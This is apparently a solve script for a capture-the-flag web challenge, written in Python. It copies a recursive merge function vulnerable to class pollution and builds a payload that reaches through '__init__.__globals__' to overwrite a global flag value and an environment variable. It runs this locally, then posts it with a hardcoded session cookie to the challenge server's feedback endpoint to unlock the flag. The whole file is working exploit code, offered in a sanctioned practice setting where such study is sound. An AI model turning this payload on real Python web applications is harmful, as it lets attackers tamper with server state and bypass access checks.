import os
import json
import requests

flag = os.getenv("flag")

class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
            
            


def local_solve():
    print(flag)
    obj = Feedback()
    exploit = {
        "__init__": {
            "__globals__": {
                "os": {
                    "environ": {
                        "flag": "true"
                    }
                },
                "flag": "true"
            }
        }
    }
    merge(exploit, obj)
    print(flag)
    

def remote_solve():
    cookies = {
        'session': '.eJwljjkOwzAMwP7iuYMUy7aUzwSyDrRr0kxF_94U2UhO_JQt9zieZX3vZzzK9vKylgGdLLpD4xYcsLRRswOn-LREXTSvWJOsGvIykpEGsCjOcCc2CtIqYjTUcYLOQdIc0BibkPcGf63uDsp8sVdWhFSeAhrlGjmP2O8bLN8fvHQvbA.Zoi-JA.1Z9qIMDsS_OjqudYdxJhrh_Tja4'
    }
    exploit = {
        "__init__": {
            "__globals__": {
                "os": {
                    "environ": {
                        "flag": "true"
                    }
                },
                "flag": "true"
            }
        }
    }
    url = 'https://web-co2-630afc019691685b.2024.ductf.dev'
    r = requests.post(url+"/save_feedback", cookies=cookies, json=exploit)
    print(r.text)
    r = requests.get(url+"/get_flag", cookies=cookies)
    print(r.text)
    
local_solve()
remote_solve()